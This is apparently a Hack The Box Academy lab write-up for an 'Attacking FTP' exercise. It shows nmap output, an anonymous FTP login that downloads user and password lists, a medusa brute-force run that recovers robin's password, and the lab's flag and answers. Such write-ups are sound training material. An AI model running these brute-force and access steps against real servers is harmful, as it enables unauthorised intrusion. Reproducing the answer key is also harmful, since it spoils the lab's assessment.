# Section 05: Attacking FTP

Module: 11. Attacking Common Services

---

## Questions & Answers

### 1. What port is the FTP service running on?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ nmap -sC -sV -v 10.129.106.239
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-08 05:41 EDT
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2121/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
|_-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.106.239]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.95%I=7%D=8/8%Time=6A76F9DC%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8D,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.1
SF:06\.239\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-08-08T09:42:08
|_  start_date: N/A
| nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ATTCSVC-LINUX<00>    Flags: <unique><active>
|   ATTCSVC-LINUX<03>    Flags: <unique><active>
|   ATTCSVC-LINUX<20>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

**Answer:** `2121`

---

### 2. What username is available for the FTP server?

Context:
- The service allows anonymous login:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ ftp 10.129.106.239 2121
Connected to 10.129.106.239.
220 ProFTPD Server (InlaneFTP) [10.129.106.239]
Name (10.129.106.239:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48407|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> get passwords.list
local: passwords.list remote: passwords.list
229 Entering Extended Passive Mode (|||31813|)
150 Opening BINARY mode data connection for passwords.list (1959 bytes)
  1959      768.61 KiB/s 
226 Transfer complete
1959 bytes received in 00:00 (10.99 KiB/s)
ftp> get users.list
local: users.list remote: users.list
229 Entering Extended Passive Mode (|||10365|)
150 Opening BINARY mode data connection for users.list (72 bytes)
    72      116.79 KiB/s 
226 Transfer complete
72 bytes received in 00:00 (0.40 KiB/s)
ftp> 
```
- Brute-force:
```bash
─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ medusa -M ftp -h 10.129.106.239 -U users.list -P passwords.list -n 2121
<SNIP>
2026-08-08 06:13:40 ACCOUNT FOUND: [ftp] Host: 10.129.106.239 User: robin Password: 7iz4rnckjsduza7 [SUCCESS]
```

**Answer:** `robin`

---

### 3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ ftp 10.129.106.239 2121
Connected to 10.129.106.239.
220 ProFTPD Server (InlaneFTP) [10.129.106.239]
Name (10.129.106.239:root): robin
331 Password required for robin
Password: 
230 User robin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7587|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 robin    robin          27 Apr 18  2022 flag.txt
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||9617|)
150 Opening BINARY mode data connection for flag.txt (27 bytes)
    27       14.17 KiB/s 
226 Transfer complete
27 bytes received in 00:00 (0.15 KiB/s)
ftp> !cat flag.txt
HTB{ATT4CK1NG_F7P_53RV1C3}
ftp> 
```


**Answer:** `HTB{ATT4CK1NG_F7P_53RV1C3}`

---

[Back to Module Index](./README.md)
